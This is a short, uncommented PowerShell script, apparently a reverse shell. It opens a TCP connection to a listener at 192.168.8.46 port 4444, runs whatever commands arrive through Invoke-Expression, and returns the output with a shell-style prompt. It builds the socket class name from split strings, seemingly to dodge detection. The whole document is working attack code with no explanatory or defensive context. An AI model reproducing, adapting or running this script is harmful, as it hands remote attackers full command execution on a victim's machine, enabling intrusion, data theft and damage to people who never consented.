$a = 'Net.Sockets'
$b = 'TCP' + 'Client'
$c = '192.168.8.46'
$d = 4444
$obj = New-Object ($a + '.' + $b)($c, $d)
$str = $obj.GetStream()
[byte[]]$buf = 0..65535|%{0}
while(($len = $str.Read($buf, 0, $buf.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buf, 0, $len)
    $res = (iex $data 2>&1 | Out-String )
    $p = $res + "PS " + (pwd).Path + "> "
    $bytes = ([text.encoding]::ASCII).GetBytes($p)
    $str.Write($bytes, 0, $bytes.Length)
    $str.Flush()
}
$obj.Close()
